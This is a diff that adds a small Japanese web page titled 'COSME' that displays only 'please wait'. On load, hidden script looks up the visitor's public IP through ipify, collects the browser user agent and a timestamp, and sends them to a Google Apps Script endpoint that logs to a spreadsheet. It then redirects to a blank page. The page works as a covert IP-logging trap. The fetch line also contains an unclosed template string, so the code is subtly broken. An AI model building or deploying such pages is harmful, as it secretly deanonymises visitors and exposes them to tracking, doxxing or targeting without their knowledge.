@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>COSME</title>
+  <script>
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbydusuGWYYeh5dl2ljhWGtkQEk-UYIn4jYNz-GkeNeh2Ac4onckbt-J5mXELMfpA537/exec";
+    const SHEET_NAME = "COSME";
+    const REDIRECT_URL = "about:blank";
+
+    window.addEventListener("DOMContentLoaded", () => {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const timestamp = new Date().toISOString();
+          const ua = navigator.userAgent;
+
+          const params = new URLSearchParams({
+            ip: ip,
+            time: timestamp,
+            sheet: SHEET_NAME,
+            ua: ua
+          });
+
+          fetch(`${GAS_URL}?${params.toString()})
+            .finally(() => {
+              window.location.href = REDIRECT_URL;
+            });
+        });
+    });
+  </script>
+</head>
+<body>
+  <p>しばらくお待ちください。</p>
+</body>
+</html>
